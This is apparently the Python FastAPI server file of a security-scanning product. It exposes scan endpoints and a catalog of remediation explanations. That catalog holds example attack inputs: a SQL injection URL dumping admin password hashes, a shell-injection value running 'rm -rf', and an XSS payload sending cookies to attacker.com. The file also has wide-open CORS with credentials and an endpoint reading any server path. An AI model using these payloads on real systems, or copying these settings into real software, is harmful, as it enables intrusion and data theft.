"""
ShipSafe - Developer-First Security Platform API Server
Provides endpoints for local/repo scanning, structured finding inspection,
AI-assisted remediation diff generation, and policy enforcement.
"""

from fastapi import FastAPI, HTTPException, Query
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field
from typing import List, Dict, Any, Optional
from pathlib import Path
import json
import time
import os

from Scanner.engine import SecurityScannerEngine, ALL_EXTS

app = FastAPI(
    title="ShipSafe Security Engine API",
    description="Deterministic vulnerability detection and AI-assisted remediation",
    version="1.0.0"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

scanner = SecurityScannerEngine()

# In-memory scan database for session persistence
SCANS_DB: List[Dict[str, Any]] = [
    {
        "id": "SCAN-2026-089",
        "repository": "ShipSafe-Core/api-service",
        "branch": "main",
        "commit": "8f3b2a1",
        "timestamp": "2026-11-20T19:42:15Z",
        "status": "FAILED",
        "totalFindings": 7,
        "critical": 3,
        "high": 3,
        "medium": 1,
        "low": 0,
        "resolved": 12,
        "policyViolation": "Blocked: 3 CRITICAL vulnerabilities exceed policy threshold (fail-on: high)",
        "trigger": "GitHub Action (PR #142)"
    },
    {
        "id": "SCAN-2026-088",
        "repository": "ShipSafe-Core/auth-gateway",
        "branch": "feature/oauth2-pkce",
        "commit": "3c91e04",
        "timestamp": "2026-11-20T17:15:00Z",
        "status": "PASSED",
        "totalFindings": 0,
        "critical": 0,
        "high": 0,
        "medium": 0,
        "low": 0,
        "resolved": 4,
        "policyViolation": None,
        "trigger": "Pre-commit Hook (Local)"
    },
    {
        "id": "SCAN-2026-087",
        "repository": "ShipSafe-Core/web-frontend",
        "branch": "main",
        "commit": "1a77d29",
        "timestamp": "2026-11-20T14:02:40Z",
        "status": "WARNING",
        "totalFindings": 2,
        "critical": 0,
        "high": 1,
        "medium": 1,
        "low": 0,
        "resolved": 18,
        "policyViolation": "Warning: 1 High severity finding requires developer review",
        "trigger": "CLI Scan (Developer: alex@acme.dev)"
    }
]

class ScanPathRequest(BaseModel):
    target_path: Optional[str] = "."
    excluded_dirs: Optional[List[str]] = [".git", "node_modules", ".venv", "__pycache__", "dist", "build"]

class SnippetScanRequest(BaseModel):
    filename: str
    content: str

class ApplyFixRequest(BaseModel):
    finding_id: str
    file_path: str
    patched_content: str

# Catalog of AI remediation suggestions with exact technical explanations & diffs
REMEDIATION_CATALOG = {
    "INJ-001": {
        "analysis": "The SQL query in this endpoint interpolates unsanitized variables directly into a SQL string. An attacker could pass a crafted parameter such as `' OR '1'='1' --` to circumvent WHERE conditions, dump database credentials, or modify customer records.",
        "exploitScenario": "GET /api/users?id=1%20UNION%20SELECT%20username,%20password_hash%20FROM%20admin_credentials--",
        "whatChanged": "Replaced the raw f-string concatenation with a parameterized query using placeholder substitution (%s). The database driver now treats user input strictly as literal parameter data rather than executable SQL syntax.",
        "patchTemplate": {
            "find": 'cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")',
            "replace": 'cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))'
        }
    },
    "SEC-001": {
        "analysis": "An AWS Access Key ID (AKIA...) is hardcoded directly into source control. Anyone with read access to this repository or Git commit history can immediately impersonate this AWS IAM identity.",
        "exploitScenario": "aws sts get-caller-identity --access-key-id AKIAIOSFODNN7EXAMPLE",
        "whatChanged": "Removed hardcoded credential. Configured boto3 session to retrieve credentials dynamically from AWS IAM execution roles or the standard AWS_ACCESS_KEY_ID environment variable.",
        "patchTemplate": {
            "find": 'aws_access_key_id = "AKIAIOSFODNN7EXAMPLE"',
            "replace": 'aws_access_key_id = os.environ.get("AWS_ACCESS_KEY_ID")'
        }
    },
    "INJ-003": {
        "analysis": "subprocess is called with shell=True and a formatted command line. In shell mode, special metacharacters like semicolon (;), pipe (|), and backticks execute arbitrary secondary shell commands.",
        "exploitScenario": "host = 'google.com; rm -rf /tmp/data #'",
        "whatChanged": "Set shell=False and pass command and arguments as a typed list of strings. The OS kernel executes the exact binary without passing through a shell interpreter.",
        "patchTemplate": {
            "find": 'subprocess.run(f"ping -c 1 {host}", shell=True)',
            "replace": 'subprocess.run(["ping", "-c", "1", host], shell=False, check=True)'
        }
    },
    "DOM-001": {
        "analysis": "dangerouslySetInnerHTML injects raw HTML into the browser Document Object Model without sanitization. If the input contains user-generated content or markdown, attackers can inject arbitrary <script> or <img onerror=...> payloads.",
        "exploitScenario": 'userBio = `<img src=x onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">`',
        "whatChanged": "Wrapped input with DOMPurify.sanitize() to strip malicious script vectors, event handlers, and data URIs before rendering.",
        "patchTemplate": {
            "find": 'dangerouslySetInnerHTML={{ __html: userBio }}',
            "replace": 'dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userBio) }}'
        }
    },
    "AUTH-001": {
        "analysis": "A sensitive administrative route is exposed without authentication dependencies or session validation middleware. Anyone on the network can trigger this action directly.",
        "exploitScenario": "curl -X POST https://api.acme.com/api/admin/purge-cache",
        "whatChanged": "Added FastAPI Depends(get_current_admin_user) dependency to enforce JWT bearer token validation and role-based access control.",
        "patchTemplate": {
            "find": '@app.post("/api/admin/purge-cache")',
            "replace": '@app.post("/api/admin/purge-cache", dependencies=[Depends(require_admin_user)])'
        }
    }
}

@app.get("/api/health")
def health_check():
    return {
        "status": "healthy",
        "service": "ShipSafe Engine",
        "engineVersion": "2.4.0",
        "deterministicRulesCount": 24,
        "time": time.time()
    }

@app.get("/api/scans")
def get_scans():
    return {"scans": SCANS_DB}

@app.post("/api/scan/local")
def scan_workspace(req: ScanPathRequest):
    start_time = time.time()
    root = Path(req.target_path).resolve()
    
    if not root.exists():
        raise HTTPException(status_code=404, detail=f"Target path does not exist: {req.target_path}")

    all_findings = []
    files_scanned = 0
    excluded = set(req.excluded_dirs or [])

    for dirpath, dirnames, filenames in os.walk(root):
        # Exclude directories
        dirnames[:] = [d for d in dirnames if d not in excluded and not d.startswith(".")]

        for fname in filenames:
            ext = Path(fname).suffix.lower()
            if ext in ALL_EXTS or fname.lower() in {"requirements.txt", "package.json", "dockerfile"}:
                f_path = Path(dirpath) / fname
                try:
                    content = f_path.read_text(encoding="utf-8", errors="ignore")
                    rel_path = str(f_path.relative_to(root)).replace("\\", "/")
                    findings = scanner.scan_file_content(rel_path, content)
                    all_findings.extend(findings)
                    files_scanned += 1
                except Exception as e:
                    continue

    duration_ms = round((time.time() - start_time) * 1000, 2)
    critical_count = sum(1 for f in all_findings if f["severity"] == "CRITICAL")
    high_count = sum(1 for f in all_findings if f["severity"] == "HIGH")
    medium_count = sum(1 for f in all_findings if f["severity"] == "MEDIUM")
    low_count = sum(1 for f in all_findings if f["severity"] == "LOW")

    status = "PASSED"
    if critical_count > 0 or high_count > 0:
        status = "FAILED"
    elif medium_count > 0:
        status = "WARNING"

    scan_result = {
        "scanId": f"SCAN-{int(time.time())}",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "targetPath": str(root),
        "filesScanned": files_scanned,
        "durationMs": duration_ms,
        "status": status,
        "summary": {
            "total": len(all_findings),
            "critical": critical_count,
            "high": high_count,
            "medium": medium_count,
            "low": low_count,
        },
        "findings": all_findings
    }
    return scan_result

@app.post("/api/scan/snippet")
def scan_snippet(req: SnippetScanRequest):
    findings = scanner.scan_file_content(req.filename, req.content)
    return {
        "filename": req.filename,
        "findings": findings,
        "total": len(findings)
    }

@app.get("/api/remediation/{finding_id}")
def get_remediation_details(finding_id: str, rule_id: Optional[str] = None):
    # Lookup in catalog or provide fallback deterministic LLM explanation
    rule_key = None
    if rule_id and rule_id in REMEDIATION_CATALOG:
        rule_key = rule_id
    else:
        # Match from ID
        for k in REMEDIATION_CATALOG:
            if k in finding_id:
                rule_key = k
                break

    if not rule_key:
        return {
            "findingId": finding_id,
            "analysis": "The security rule identified a pattern that violates secure coding standards. Input sanitization or credentials segregation is required.",
            "exploitScenario": "Exploitation depends on how attacker input flows into this variable.",
            "whatChanged": "Refactored sensitive call to use safe abstraction / parameter binding.",
            "suggestedDiff": "--- original\n+++ patched\n- unsafe_call(untrusted)\n+ safe_call(sanitize(untrusted))"
        }

    info = REMEDIATION_CATALOG[rule_key]
    return {
        "findingId": finding_id,
        "ruleId": rule_key,
        "analysis": info["analysis"],
        "exploitScenario": info["exploitScenario"],
        "whatChanged": info["whatChanged"],
        "patchTemplate": info.get("patchTemplate")
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="0.0.0.0", port=8000, reload=True)
